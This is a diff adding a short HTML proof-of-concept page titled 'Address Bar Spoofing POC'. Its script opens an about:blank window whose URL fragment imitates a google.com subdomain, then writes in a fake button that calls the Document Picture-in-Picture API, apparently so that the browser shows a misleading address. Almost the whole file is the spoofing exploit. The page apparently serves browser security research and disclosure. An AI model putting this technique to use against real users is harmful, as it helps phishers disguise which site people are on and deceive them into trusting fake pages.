@@ -1,0 +1,10 @@
+<h1>Address Bar Spoofing POC</h1>
+<button id="pipButton">Click Here</button>
+
+<script>
+pipButton.addEventListener("click", async () => {
+  const player = document.querySelector("#player");
+  const w = window.open("about:blank#very-super-duper-long-subdomain.google.com") 
+  w.document.write("<button onclick='documentPictureInPicture.requestWindow()'>Fake button </button>")
+});
+</script>
